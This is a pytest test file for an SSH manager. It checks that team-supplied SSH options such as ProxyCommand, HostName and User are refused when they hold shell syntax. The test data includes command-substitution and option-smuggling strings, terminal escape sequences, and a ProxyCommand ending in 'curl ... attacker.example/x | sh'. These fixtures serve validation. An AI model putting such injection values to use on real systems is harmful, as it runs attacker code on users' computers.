"""A team cannot get an option past the list by the way it writes it."""
from __future__ import annotations

import asyncio
import json
import os
import stat
import time
from pathlib import Path
from unittest.mock import MagicMock

import pytest
from textual.app import App
from textual.widgets import Button, DataTable, Static

from servonaut.config.manager import ConfigManager
from servonaut.config.schema import AppConfig, ConnectionProfile, CustomServer
from servonaut.services import auth_service
from servonaut.services.connection_service import ConnectionService
from servonaut.services.custom_server_service import CustomServerService
from servonaut.services.ssh_service import SSHService
from servonaut.services.team_config_apply import apply_team_config
from servonaut.services.team_config_subset import diff_against_local
from servonaut.utils.ssh_option_policy import (
    RefusedOption,
    SSHOptionRefused,
    canonical,
    classify,
    judge_entries,
    option_entries,
    proxy_command_entry,
)

TEAM = {"id": 7, "slug": "acme", "name": "Acme"}
RULE = [{"name": "all", "match_conditions": {}, "profile_name": "jump"}]
MARKER = "/var/tmp/servonaut-sec/never-created"


def pull_and_build(tmp_path: Path, payload: dict, *, server: str | None = None):
    """Pull, save, reload as a new process would, and build the way every surface does."""
    manager = ConfigManager(config_path=tmp_path / "config.json")
    config = manager.load()
    applied = apply_team_config(config, payload, team=TEAM)
    manager.save(config)
    manager = ConfigManager(config_path=tmp_path / "config.json")
    config = manager.load()
    conn, ssh = ConnectionService(manager), SSHService(manager)
    if server:
        instance = next(r for r in CustomServerService(manager).list_as_instances() if r["name"] == server)
    else:
        instance = {"id": "i-1", "name": "web-1", "private_ip": "10.0.0.5", "public_ip": "10.0.0.5"}
    profile = conn.resolve_profile(instance)
    recorded = [i["option"] for i in config.ssh.team_options]

    def build():
        return ssh.build_ssh_command(
            host="10.0.0.5", username="deploy", port=1, remote_command="true",
            proxy_args=conn.get_proxy_args(profile) if profile else [],
            extra_options=conn.get_extra_options(instance, profile),
        )

    return applied, recorded, build


# --- values a shell would read -----------------------------------------------

@pytest.mark.parametrize("value", ["\"x'$(touch /tmp/m)'\"", "x;y", "a b", "x`id`", "$(id)"])
@pytest.mark.parametrize("name", ["HostName", "hostkeyalias"])
def test_a_host_value_with_shell_syntax_is_refused(name, value):
    verdict = classify(f"{name}={value}")
    assert verdict.kind == "refused" and verdict.phrase == "holds characters a shell reads as a command"


@pytest.mark.parametrize("value", ["db-1.internal", "%h.corp.example.com", "[2001:db8::1]", "10.0.0.5"])
def test_real_host_values_are_accepted(value):
    assert classify(f"HostName={value}").kind == "accepted"


def test_user_and_port_values_are_checked_too():
    assert classify("User=a'b").kind == "refused"
    assert classify("User=deploy").kind == "accepted"
    assert classify("Port=22").kind == "accepted"
    assert classify("Port=22 -oX").kind == "refused"
    assert classify("Port=%d").kind == "refused"


def test_a_team_hostname_with_a_quote_never_reaches_the_bastion_hop(tmp_path):
    payload = {
        "connection_profiles": [{
            "name": "jump", "bastion_host": "bastion.example.com",
            "extra_ssh_options": [f"HostName=\"x'$(touch {MARKER})'\""],
        }],
        "connection_rules": RULE,
    }
    applied, recorded, build = pull_and_build(tmp_path, payload)
    assert applied.refused_options == 1 and len(recorded) == 1
    with pytest.raises(SSHOptionRefused, match="sets HostName, which holds characters a shell reads"):
        build()


def test_a_shared_record_hostname_with_a_quote_is_refused():
    row = {"id": "s-1", "name": "web-1", "is_shared": True, "team_name": "Acme",
           "extra_ssh_options": ["HostName=\"x'$(id)'\""]}
    manager = MagicMock()
    manager.get.return_value = AppConfig()
    (judged,) = ConnectionService(manager).get_extra_options(row, None)
    assert isinstance(judged, RefusedOption)


# --- entries of the wrong shape ----------------------------------------------

def test_a_proxy_command_that_is_a_list_is_recorded_and_refused(tmp_path):
    payload = {"connection_profiles": [{"name": "jump", "proxy_command": [f"\"'$(touch {MARKER}) #"]}],
               "connection_rules": RULE}
    applied, recorded, build = pull_and_build(tmp_path, payload)
    assert applied.refused_options == 1
    with pytest.raises(SSHOptionRefused, match="ProxyCommand"):
        build()


def test_extra_options_given_as_a_mapping_are_recorded_and_refused_on_a_profile(tmp_path):
    payload = {"connection_profiles": [{"name": "jump", "extra_ssh_options": {f"ProxyCommand=touch {MARKER}": 1}}],
               "connection_rules": RULE}
    applied, _recorded, build = pull_and_build(tmp_path, payload)
    assert applied.refused_options == 1
    with pytest.raises(SSHOptionRefused):
        build()


def test_extra_options_given_as_a_mapping_are_recorded_and_refused_on_a_custom_server(tmp_path):
    payload = {"custom_servers": [{"name": "web-1", "host": "10.0.0.5", "username": "deploy",
                                   "extra_ssh_options": {f"ProxyCommand=touch {MARKER}": 1}}]}
    applied, _recorded, build = pull_and_build(tmp_path, payload, server="web-1")
    assert applied.refused_options == 1
    with pytest.raises(SSHOptionRefused):
        build()


def test_the_helpers_give_every_reader_the_same_entries():
    assert proxy_command_entry(None) is None and proxy_command_entry("  ") is None
    assert proxy_command_entry([]) is None
    assert option_entries(None) == [] and option_entries({}) == []
    assert option_entries(["a=1", "b=2"]) == ["a=1", "b=2"]
    assert option_entries({"a": 1}) == [{"a": 1}]
    assert option_entries("ProxyCommand=x") == ["ProxyCommand=x"]


# --- whitespace and case --------------------------------------------------------

@pytest.mark.parametrize(
    "command",
    [f"touch {MARKER}\n", f"  touch {MARKER}", f"\ttouch {MARKER} \t", f"touch {MARKER}\r\n", f"\n touch {MARKER}\n\n"],
)
def test_a_proxy_command_is_refused_however_it_is_padded(tmp_path, command):
    payload = {"connection_profiles": [{"name": "jump", "proxy_command": command}], "connection_rules": RULE}
    applied, recorded, build = pull_and_build(tmp_path, payload)
    assert recorded == [f"proxycommand=touch {MARKER}"]
    with pytest.raises(SSHOptionRefused):
        build()


def test_the_command_that_runs_is_the_command_that_was_allowed(tmp_path):
    payload = {"connection_profiles": [{"name": "jump", "proxy_command": f"Touch {MARKER}\n"}],
               "connection_rules": RULE}
    _applied, recorded, _build = pull_and_build(tmp_path, payload)
    assert recorded == [f"proxycommand=Touch {MARKER}"]
    config_path = tmp_path / "config.json"
    data = json.loads(config_path.read_text())
    data["ssh"]["team_options"][0]["allowed"] = True
    config_path.write_text(json.dumps(data))
    manager = ConfigManager(config_path=config_path)
    manager.load()
    conn = ConnectionService(manager)
    profile = manager.get().connection_profiles[0]
    assert conn.get_proxy_args(profile) == ["-o", f"ProxyCommand=Touch {MARKER}"]


def test_canonical_text_is_the_same_however_a_malformed_entry_was_built():
    assert canonical("ProxyCommand") == "proxycommand"
    assert canonical("  -oProxyCommand=Touch X ") == "-oproxycommand=Touch X"
    assert canonical("proxycommand=x ") == "proxycommand=x "


# --- the entry lines an editor splits ------------------------------------------

def test_every_line_of_a_multi_line_entry_is_recorded(tmp_path):
    payload = {"custom_servers": [{"name": "web-1", "host": "10.0.0.5", "username": "deploy",
                                   "extra_ssh_options": [f"Compression=yes\nProxyCommand=touch {MARKER}"]}]}
    _applied, recorded, _build = pull_and_build(tmp_path, payload, server="web-1")
    assert f"proxycommand=touch {MARKER}" in recorded


@pytest.mark.asyncio
async def test_saving_a_pulled_custom_server_in_its_form_keeps_the_option_refused(tmp_path):
    from servonaut.screens.custom_servers import CustomServersScreen
    from servonaut.styles import CSS_FILES

    manager = ConfigManager(config_path=tmp_path / "config.json")
    config = manager.load()
    apply_team_config(config, {"custom_servers": [{
        "name": "web-1", "host": "10.0.0.5", "username": "deploy",
        "extra_ssh_options": [f"Compression=yes\nProxyCommand=touch {MARKER}"],
    }]}, team=TEAM)
    manager.save(config)

    class Host(App):
        CSS_PATH = CSS_FILES

        def __init__(self) -> None:
            super().__init__()
            self.demo_mode = False
            self.redaction_service = None
            self.custom_server_service = CustomServerService(manager)
            self.instances = []

        def on_mount(self) -> None:
            self.push_screen(CustomServersScreen())

    app = Host()
    async with app.run_test(size=(166, 47)) as pilot:
        await pilot.pause()
        screen = app.screen
        screen._show_form(manager.get().custom_servers[0])
        await pilot.pause()
        screen.query_one("#input_ssh_key").value = "~/.ssh/own_key"
        screen.query_one("#btn_save_server", Button).press()
        deadline = time.monotonic() + 10
        while len(manager.get().custom_servers[0].extra_ssh_options) < 2:
            assert time.monotonic() < deadline, "the form did not save"
            await pilot.pause()

    saved = manager.get().custom_servers[0]
    assert saved.extra_ssh_options == ["Compression=yes", f"ProxyCommand=touch {MARKER}"]
    conn, ssh = ConnectionService(manager), SSHService(manager)
    row = next(r for r in CustomServerService(manager).list_as_instances() if r["name"] == "web-1")
    with pytest.raises(SSHOptionRefused, match="ProxyCommand"):
        ssh.build_ssh_command(host="10.0.0.5", username="d", extra_options=conn.get_extra_options(row, None))


# --- more refused names -----------------------------------------------------------

@pytest.mark.parametrize("entry,phrase", [
    ("StreamLocalBindUnlink=yes", "can replace a file on this computer"),
    ("GSSAPIDelegateCredentials=yes", "lets the server use this computer's Kerberos credentials"),
    ("IgnoreUnknown=Servonaut*", "makes SSH skip settings it does not know"),
])
def test_these_options_are_refused_from_a_team(entry, phrase):
    verdict = classify(entry)
    assert verdict.kind == "refused" and verdict.phrase == phrase


@pytest.mark.parametrize("entry", ["StreamLocalBindUnlink=no", "GSSAPIDelegateCredentials=false"])
def test_switching_them_off_is_accepted(entry):
    assert classify(entry).kind == "accepted"
    assert classify("IgnoreUnknown=no").kind == "refused"


# --- the one-time step --------------------------------------------------------------

@pytest.fixture
def home(tmp_path, monkeypatch):
    monkeypatch.setattr(auth_service, "AUTH_FILE", tmp_path / "auth.json")
    return tmp_path


def _old_config(home: Path) -> Path:
    path = home / "config.json"
    path.write_text(json.dumps({
        "version": 7,
        "connection_profiles": [{"name": "jump", "proxy_command": "ssh -W %h:%p jump"}],
    }))
    return path


@pytest.mark.skipif(os.geteuid() == 0, reason="root ignores directory permissions")
def test_a_config_that_cannot_be_written_still_loads_with_the_options_refused(home):
    (home / "auth.json").write_text(json.dumps({"teams_fetched_at": 1.0, "teams_cached": [{"slug": "a"}]}))
    directory = home / "ro"
    directory.mkdir()
    path = _old_config(directory)
    before = path.read_bytes()
    directory.chmod(stat.S_IRUSR | stat.S_IXUSR)
    try:
        manager = ConfigManager(config_path=path)
        config = manager.load()
    finally:
        directory.chmod(stat.S_IRWXU)
    assert manager.load_error is None
    assert [c.name for c in config.connection_profiles] == ["jump"]
    assert [i["allowed"] for i in config.ssh.team_options] == [False]
    assert path.read_bytes() == before
    refused = ConnectionService(manager).get_proxy_args(config.connection_profiles[0])[1]
    assert isinstance(refused, RefusedOption)


def test_a_config_version_that_is_left_alone_still_has_its_options_recorded_in_memory(home):
    (home / "auth.json").write_text(json.dumps({"teams_fetched_at": 1.0, "teams_cached": [{"slug": "a"}]}))
    path = home / "config.json"
    path.write_text(json.dumps({
        "version": "abc", "connection_profiles": [{"name": "jump", "proxy_command": "x"}],
    }))
    before = path.read_bytes()
    config = ConfigManager(config_path=path).load()
    assert [i["option"] for i in config.ssh.team_options] == ["proxycommand=x"]
    assert path.read_bytes() == before


def test_a_missing_sign_in_file_does_not_settle_the_question(home):
    path = _old_config(home)
    manager = ConfigManager(config_path=path)
    assert manager.load().ssh.team_options == []
    assert manager.get().ssh.team_options_checked is False
    assert json.loads(path.read_text()).get("ssh", {}).get("team_options_checked") in (None, False)

    # The member signs in later: the first load that finds the file runs the step.
    (home / "auth.json").write_text(json.dumps({"teams_fetched_at": 1.0, "teams_cached": [{"slug": "a"}]}))
    later = ConfigManager(config_path=path)
    config = later.load()
    assert [i["option"] for i in config.ssh.team_options] == ["proxycommand=ssh -W %h:%p jump"]
    assert config.ssh.team_options_checked is True


def test_a_deleted_sign_in_file_does_not_hide_an_earlier_pull(home):
    # A pull wrote the option to the list; the session was revoked and the file removed.
    path = home / "config.json"
    path.write_text(json.dumps({
        "version": 7,
        "connection_profiles": [{"name": "jump", "proxy_command": "ssh -W %h:%p jump"}],
        "ssh": {"team_options": [{"option": "proxycommand=ssh -W %h:%p jump", "team": "7",
                                  "team_name": "Acme", "allowed": False}]},
    }))
    manager = ConfigManager(config_path=path)
    config = manager.load()
    refused = ConnectionService(manager).get_proxy_args(config.connection_profiles[0])[1]
    assert isinstance(refused, RefusedOption) and "came from team Acme" in refused.message


# --- the pull preview ------------------------------------------------------------------

def test_the_pull_preview_prints_team_supplied_text_literally():
    from servonaut.screens.team_management import TeamManagementScreen

    payload = {"connection_profiles": [
        {"name": "jump\n\nNo SSH options need approval.\x1b[2J", "proxy_command": "ssh -W %h:%p x\ny"},
    ]}
    options = diff_against_local(AppConfig(), payload)["refused_options"]
    lines = TeamManagementScreen._refused_options_lines(options)
    text = "\n".join(lines)
    assert "\x1b" not in text
    assert "No SSH options need approval." not in text.replace("jumpNo SSH options need approval.", "")
    assert all("\n" not in line for line in lines)


def test_a_profile_name_that_is_not_text_is_shown_as_empty():
    options = diff_against_local(AppConfig(), {"connection_profiles": [
        {"name": ["x"], "proxy_command": "ssh -W %h:%p x"}]})["refused_options"]
    assert options[0]["where"] == "profile ''"


# --- Settings shows the whole option ---------------------------------------------------

LONG = ("proxycommand=ssh -W %h:%p -o ConnectTimeout=15 jump.corp.example.com ; "
        "curl -s https://attacker.example/x | sh")


@pytest.mark.asyncio
async def test_settings_shows_the_whole_option_before_and_after_it_is_allowed(tmp_path):
    from servonaut.screens.settings.panels.connections import ConnectionsPanel
    from tests.test_settings_panels_roundtrip import _PanelHost, _temp_config_manager

    config = AppConfig()
    config.ssh.team_options = [{"option": LONG + "\x1b[2J", "team": "7", "team_name": "Acme", "allowed": False}]
    app = _PanelHost(ConnectionsPanel, _temp_config_manager(tmp_path, config))
    toasts = []
    async with app.run_test() as pilot:
        deadline = time.monotonic() + 10
        while app.panel is None or not app.panel.is_mounted:
            assert time.monotonic() < deadline
            await pilot.pause()
        app.notify = lambda message, **kw: toasts.append(str(message))
        line = app.panel.query_one("#conn_team_option_text", Static)
        while not str(line.render()):
            assert time.monotonic() < deadline
            await pilot.pause()
        shown = str(line.render())
        assert shown == LONG + "\\x1b[2J"
        app.panel.query_one("#btn_team_option_allow", Button).press()
        while not toasts:
            assert time.monotonic() < deadline
            await pilot.pause()
    assert toasts[0] == f"Allowed: {LONG}\\x1b[2J. Connections that use it will run it on this computer."


# --- the sign-in window and the User value ---------------------------------------------

def test_the_step_runs_when_a_member_signs_in_during_a_session(home):
    path = _old_config(home)
    manager = ConfigManager(config_path=path)
    config = manager.load()
    conn = ConnectionService(manager)
    profile = config.connection_profiles[0]
    assert conn.get_proxy_args(profile) == ["-o", "ProxyCommand=ssh -W %h:%p jump"]

    (home / "auth.json").write_text(json.dumps({"teams_fetched_at": 1.0, "teams_cached": [{"slug": "a"}]}))
    assert manager.record_saved_team_options() == 1

    assert isinstance(conn.get_proxy_args(profile)[1], RefusedOption)
    assert json.loads(path.read_text())["ssh"]["team_options_checked"] is True
    assert manager.record_saved_team_options() == 0


def test_the_app_runs_the_step_after_a_sign_in(home):
    from servonaut.app import ServonautApp

    (home / "auth.json").write_text(json.dumps({"teams_fetched_at": 1.0, "teams_cached": [{"slug": "a"}]}))
    fake = MagicMock()
    fake.config_manager.record_saved_team_options.return_value = 2
    ServonautApp._note_saved_team_options(fake)
    fake._notify_saved_team_options.assert_called_once_with(2)
    fake._notify_saved_team_options.reset_mock()
    fake.config_manager.record_saved_team_options.return_value = 0
    ServonautApp._note_saved_team_options(fake)
    fake._notify_saved_team_options.assert_not_called()


@pytest.mark.parametrize("value", ["a$(id)", "a;id", "a`id`", "a|b", "a&b", "a<b", "a>b", "a(b)", "-oProxyCommand=x", "a\"b"])
def test_a_user_with_shell_syntax_is_refused(value):
    assert classify(f"User={value}").kind == "refused"


@pytest.mark.parametrize("value", ["deploy", "DOMAIN\\svc account", "jdoe@CORP", "%r", "john.smith", "ü"])
def test_real_user_names_are_accepted(value):
    assert classify(f"User={value}").kind == "accepted"


@pytest.mark.parametrize("value", ["x -oProxyCommand=id", "x  -E/tmp/log", "a\\", "a b\\", "x\t-oX"])
def test_a_user_that_would_start_an_option_or_end_in_a_backslash_is_refused(value):
    assert classify(f"User={value}").kind == "refused"


LEGITIMATE_USERS = [
    "DOMAIN\\svc account", "CORP\\jdoe", "jdoe@corp.example.com", "%r", "%u", "john.smith", "svc+deploy",
    "ünal", "用户", "user#1", "A B C", "deploy", "ec2-user", "ubuntu", "root", "web_1", "a-b", "j.doe-2",
    "o'neil".replace("'", ""), "x y-z", "name@DOMAIN",
]


@pytest.mark.parametrize("value", LEGITIMATE_USERS)
def test_legitimate_user_names_stay_accepted(value):
    assert classify(f"User={value}").kind == "accepted"


def test_the_sign_in_hook_runs_the_saved_options_step():
    """The real hook, not a copy: with the call removed from it this fails."""
    from servonaut.app import ServonautApp

    calls = []
    stub = MagicMock()
    stub.relay_manager = None
    stub.memory_sync_service = None
    stub.auth_service = None
    stub._note_saved_team_options = lambda: calls.append("step")
    ServonautApp.on_user_login_success(stub)
    assert calls == ["step"]


def test_the_login_screen_calls_the_app_hook_after_a_successful_sign_in():
    import inspect

    from servonaut.screens import login

    source = inspect.getsource(login)
    assert 'getattr(self.app, "on_user_login_success", None)' in source
